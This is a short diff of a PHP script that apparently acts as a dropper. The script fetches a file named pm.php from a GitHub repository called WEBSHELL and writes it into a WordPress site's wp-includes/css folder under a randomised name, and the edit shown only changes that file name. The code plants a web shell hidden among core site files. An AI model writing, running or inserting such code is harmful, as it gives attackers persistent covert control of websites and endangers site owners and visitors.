@@ -175,7 +175,7 @@ if(file_exists($check)){
 }else 
 echo "Fail Reset" ;
 
-$check2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/css/".$ra44x.".php" ;
+$check2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-includes/css/".$ra44x."x.php" ;
 $text2 = http_get('https://raw.githubusercontent.com/botersx/WEBSHELL/master/pm.php');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
